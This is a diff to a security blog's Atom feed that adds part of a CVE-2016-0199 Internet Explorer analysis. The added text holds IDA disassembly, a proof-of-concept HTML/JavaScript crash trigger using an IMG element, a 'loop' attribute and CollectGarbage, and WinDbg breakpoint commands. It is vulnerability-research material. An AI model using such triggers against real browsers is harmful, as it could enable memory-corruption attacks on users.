@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2018-05-15T15:45:36-05:00</updated>
+  <updated>2018-05-16T11:07:32-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -88,6 +88,55 @@
 
 <p>In IDA Pro, locate the code:
 <img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/4.PNG" title="[title manually exploit [alt text]]" ></p>
+
+<p>based on the code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>.text:10200DE2                 mov     esi, [eax]
+</span><span class='line'>.text:10200DE4                 mov     ecx, [esi+44h]  ; void *
+</span><span class='line'>.text:10200DE7                 call    ds:___guard_check_icall_fptr
+</span><span class='line'>.text:10200DED                 call    dword ptr [esi+44h
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>we can guess, eax has C++ object base address and that address -4 should contain vtable address. To verifiy the assumption. Modify the PoC:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=7&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="nx">oElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;IMG&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">oAttr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="s2">&quot;loop&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="nx">oAttr</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">oElement</span><span class="p">;</span>
+</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span><span class='line'><span class="nx">CollectGarbage</span><span class="p">();</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We want to set break point at jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252</p>
+
+<p>however, since the dll is not loaded when we restart debugging. We can use windbg command <code>sxe ld:modulename</code> command to break when jscript9.dll first time load, and then we can set the breakpoint on that address.</p>
+
+<p><code>sxe ld:jscript9</code>
+<code>lmm jscript9</code>
+<code>bp jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252</code>
+<code>bl</code></p>
 ]]></content>
   </entry>
   
